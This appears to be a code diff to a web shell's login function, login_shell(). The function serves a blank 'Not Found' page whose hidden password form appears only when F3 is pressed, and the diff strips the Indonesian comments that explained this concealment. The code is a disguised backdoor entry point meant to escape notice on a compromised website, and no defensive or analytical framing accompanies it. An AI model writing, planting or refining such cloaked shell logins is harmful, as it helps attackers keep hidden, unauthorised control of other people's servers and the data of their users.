@@ -90,7 +90,6 @@ function login_shell() {
 <head>
     <title>Not Found</title>
     <style>
-        /* Tampilan Putih Polos */
         body { 
             background: #fff; 
             display: flex; 
@@ -100,7 +99,7 @@ function login_shell() {
             margin: 0; 
             font-family: sans-serif;
         }
-        /* Sembunyikan form secara default */
+		
         #login-container {
             display: none;
         }
@@ -126,15 +125,12 @@ function login_shell() {
     </div>
 
     <script>
-        // Mendengarkan input keyboard
         window.addEventListener('keydown', function(e) {
-            // Jika tombol F3 ditekan (KeyCode 114)
             if (e.keyCode === 114 || e.key === "F3") {
-                e.preventDefault(); // Mencegah fungsi pencarian bawaan browser
+                e.preventDefault();
                 var container = document.getElementById('login-container');
                 var field = document.getElementById('pass-field');
                 
-                // Tampilkan form dan fokus ke input
                 container.style.display = 'block';
                 field.focus();
             }
